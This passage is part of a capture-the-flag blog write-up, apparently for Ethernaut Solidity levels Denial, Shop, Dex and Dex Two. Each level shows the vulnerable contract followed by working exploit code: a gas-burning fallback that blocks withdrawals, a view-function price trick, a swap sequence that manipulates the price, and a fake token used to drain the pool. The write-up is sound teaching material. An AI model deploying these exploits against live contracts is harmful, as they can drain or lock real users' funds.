+    <span class="p">}</span>
+    <span class="c1">// allow deposit of funds
+</span>    <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+    <span class="c1">// convenience function
+</span>    <span class="k">function</span> <span class="n">contractBalance</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to deny the owner from withdrawing the funds . This looks like <a href="#9-king">King</a> but this is different because king challenge used transfer that reverts a transacion and throws error. Call only return boolean values.</p>
+
+<p>But it is not relying on the return value of the ` partner.call{value:amountToSend}(“”);` to transfer the funds to the owner.</p>
+
+<p>If we revert our contract which we pass it as partner , the owner still gets funds.</p>
+
+<p>We can use assert in our contract which won’t refund any gas and fails the transaction .</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Denial</span> <span class="p">{</span>
+    <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">assert</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">Address</span> <span class="k">of</span> <span class="nx">Above</span> <span class="nx">contract</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="21-shop">21 Shop</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">interface</span> <span class="n">Buyer</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">Shop</span> <span class="p">{</span>
+  <span class="kt">uint</span> <span class="k">public</span> <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">isSold</span><span class="p">;</span>
+  <span class="k">function</span> <span class="n">buy</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">Buyer</span> <span class="n">_buyer</span> <span class="o">=</span> <span class="n">Buyer</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">_buyer</span><span class="p">.</span><span class="n">price</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="n">price</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isSold</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">isSold</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+      <span class="n">price</span> <span class="o">=</span> <span class="n">_buyer</span><span class="p">.</span><span class="n">price</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to buy the item for less price than the price in contract.</p>
+
+<p>First we need to create a Buyer contract and we need to call <code class="language-plaintext highlighter-rouge">buy()</code> from the Buyer contract.</p>
+
+<p>The Buyer contract should return a number that is greater than 100 in first call (<code class="language-plaintext highlighter-rouge">if (_buyer.price() &gt;= price &amp;&amp; !isSold) </code>) and less than 100 in next call in ` price = _buyer.price();`</p>
+
+<p>We can’t use any contract storage because the function state is <code class="language-plaintext highlighter-rouge">view</code> .</p>
+
+<p>But we can use the storage of the Shop contract to return 2 different values for 1st and 2nd call .</p>
+
+<p>Here is the exploit :</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">ShopAttack</span> <span class="p">{</span>
+    <span class="n">Shop</span> <span class="n">shopcon</span><span class="p">;</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_add</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">shopcon</span> <span class="o">=</span> <span class="n">Shop</span><span class="p">(</span><span class="n">_add</span><span class="p">);</span>
+
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">buyy</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">shopcon</span><span class="p">.</span><span class="n">buy</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">shopcon</span><span class="p">.</span><span class="n">isSold</span><span class="p">()){</span>
+            <span class="k">return</span> <span class="mi">50</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">101</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="22-dex">22 Dex</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'openzeppelin-contracts-08/access/Ownable.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Dex</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">token1</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">token2</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="p">{}</span>
+  <span class="k">function</span> <span class="n">setTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_token2</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="n">token1</span> <span class="o">=</span> <span class="n">_token1</span><span class="p">;</span>
+    <span class="n">token2</span> <span class="o">=</span> <span class="n">_token2</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="n">addLiquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">token_address</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">token_address</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="n">swap</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">((</span><span class="n">from</span> <span class="o">==</span> <span class="n">token1</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">from</span> <span class="o">==</span> <span class="n">token2</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token1</span><span class="p">),</span> <span class="s">"Invalid tokens"</span><span class="p">);</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">"Not enough to swap"</span><span class="p">);</span>
+    <span class="kt">uint</span> <span class="n">swapAmount</span> <span class="o">=</span> <span class="n">getSwapPrice</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swapAmount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">swapAmount</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">getSwapPrice</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+    <span class="k">return</span><span class="p">((</span><span class="n">amount</span> <span class="o">*</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span><span class="o">/</span><span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">SwappableToken</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">SwappableToken</span><span class="p">(</span><span class="n">token2</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+    <span class="k">return</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">SwappableToken</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">private</span> <span class="n">_dex</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">dexInstance</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">initialSupply</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_mint</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">initialSupply</span><span class="p">);</span>
+        <span class="n">_dex</span> <span class="o">=</span> <span class="n">dexInstance</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">owner</span> <span class="o">!=</span> <span class="n">_dex</span><span class="p">,</span> <span class="s">"InvalidApprover"</span><span class="p">);</span>
+    <span class="nb">super</span><span class="p">.</span><span class="n">_approve</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this level we need to drain any one of the token1 or token2 from the contract .</p>
+
+<p>Initially the player has 10 of each tokens and contract has a 100 of each tokens.</p>
+
+<p>If we swap our 10 tokens of token1 with 10 tokens of token2 we get 20 tokens of token2 and 0 of token1 and the contract has 110,90 of token1 and token2 respectively.</p>
+
+<p>if we calculate the <code class="language-plaintext highlighter-rouge">getSwapPrice</code> for 20 tokens of token2 , we get 24.</p>
+
+<p>Like this we can get more tokens with the getSwapPrice function for every Swap .</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">t1</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">token1</span><span class="p">();</span>
+<span class="kd">let</span> <span class="nx">t2</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">token2</span><span class="p">();</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">t1</span><span class="p">,</span><span class="nx">t2</span><span class="p">,</span><span class="mi">24</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">t2</span><span class="p">,</span><span class="nx">t1</span><span class="p">,</span><span class="mi">30</span><span class="p">);</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">t1</span><span class="p">,</span><span class="nx">t2</span><span class="p">,</span><span class="mi">41</span><span class="p">);</span>
+<span class="nx">After</span> <span class="k">this</span> <span class="nx">we</span> <span class="kd">get</span> <span class="mi">65</span> <span class="nx">tokens</span> <span class="k">of</span> <span class="nx">token2</span> <span class="p">,</span> <span class="nx">the</span> <span class="nx">getSwapPrice</span> <span class="nx">is</span> <span class="mi">158</span> <span class="p">,</span> <span class="nx">the</span> <span class="nx">contract</span> <span class="nx">have</span> <span class="nx">only</span> <span class="mi">110</span> <span class="k">if</span> <span class="nx">we</span> <span class="nx">swap</span> <span class="mi">45</span> <span class="nx">tokens</span> <span class="k">of</span> <span class="nx">token2</span> <span class="nx">we</span> <span class="kd">get</span> <span class="nx">the</span> <span class="mi">110</span> <span class="nx">tokens</span> <span class="k">of</span> <span class="nx">token1</span><span class="p">.</span>
+<span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">t2</span><span class="p">,</span><span class="nx">t1</span><span class="p">,</span><span class="mi">45</span><span class="p">);</span>
+<span class="nx">After</span> <span class="k">this</span> <span class="nx">the</span> <span class="nx">tokens</span> <span class="k">of</span> <span class="nx">token1</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">contract</span> <span class="nx">becomes</span> <span class="mi">0</span><span class="p">.</span>
+</code></pre></div></div>
+
+<h2 id="23-dex-two">23 Dex Two</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'openzeppelin-contracts-08/access/Ownable.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">DexTwo</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">token1</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">token2</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="p">{}</span>
+  <span class="k">function</span> <span class="n">setTokens</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_token2</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="n">token1</span> <span class="o">=</span> <span class="n">_token1</span><span class="p">;</span>
+    <span class="n">token2</span> <span class="o">=</span> <span class="n">_token2</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">add_liquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">token_address</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">token_address</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">function</span> <span class="n">swap</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">"Not enough to swap"</span><span class="p">);</span>
+    <span class="kt">uint</span> <span class="n">swapAmount</span> <span class="o">=</span> <span class="n">getSwapAmount</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swapAmount</span><span class="p">);</span>
+    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">swapAmount</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">getSwapAmount</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+    <span class="k">return</span><span class="p">((</span><span class="n">amount</span> <span class="o">*</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span><span class="o">/</span><span class="n">IERC20</span><span class="p">(</span><span class="n">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">SwappableTokenTwo</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+    <span class="n">SwappableTokenTwo</span><span class="p">(</span><span class="n">token2</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+    <span class="k">return</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">SwappableTokenTwo</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">private</span> <span class="n">_dex</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">dexInstance</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">initialSupply</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_mint</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">initialSupply</span><span class="p">);</span>
+        <span class="n">_dex</span> <span class="o">=</span> <span class="n">dexInstance</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">owner</span> <span class="o">!=</span> <span class="n">_dex</span><span class="p">,</span> <span class="s">"InvalidApprover"</span><span class="p">);</span>
+    <span class="nb">super</span><span class="p">.</span><span class="n">_approve</span><span class="p">(</span><span class="n">owner</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this level we need to drain all the tokens of token1 and token2 in the contract.</p>
+
+<p>We can drain one token from the contract by that method in previous challenge.</p>
+
+<p>After that we left with 90 token2 in contract . We need to drain them , As you can see there is no from and to token check here , so we can pass any contract address that has a function of balanceOf and returns a integer greater than 1 .</p>
+
+<p>I used this contract .</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">DexTwo</span> <span class="p">{</span>
+     <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Which sets the getSwapAmount to 90 when we pass amount as 1. ( 1 * 90 /1) . Now we can swap with this contract address , token2 address , amount as 1.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">attack</span><span class="p">,</span> <span class="nx">t2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+
+</article>
+
+        </div>
+        <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
+          <div class="right-pane" style="margin-left: 1em;">
+            
+              <div class="avatar">
+                <center>
+                  
+                    <img src="/potato-hacker-theme/assets/img/avatar.jpg" alt="me" class="avatar-image">
+                  
+                  
+                    <p class="avatar-description">Building n Breaking Stuff</p>
+                  
+                  <div class="right-links">
+                    
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+                  </div>
+                </center>
+              </div>
+            
+            
+              <div class="posts-list">
+                <a href="/potato-hacker-theme/blog">
+                  <h4>Recent Posts:</h4>
+                </a>
+                <ul>
+                  
+                </ul>
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="footer">
+      <footer class="page-footer">
+  <center>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        <a onclick="toggleTheme();">
+          Light/Dark
+        </a>
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        Copyright (c) 2023 Surya -
+        <a href="mailto:d4r3d3v1l.asp@gmail.com">&lt;d4r3d3v1l.asp@gmail.com&gt;</a>
+      </div>
+    </div>
+    
+  </center>
+</footer>
+
+    </section>
+  </div>
+</body>
+
+</html>
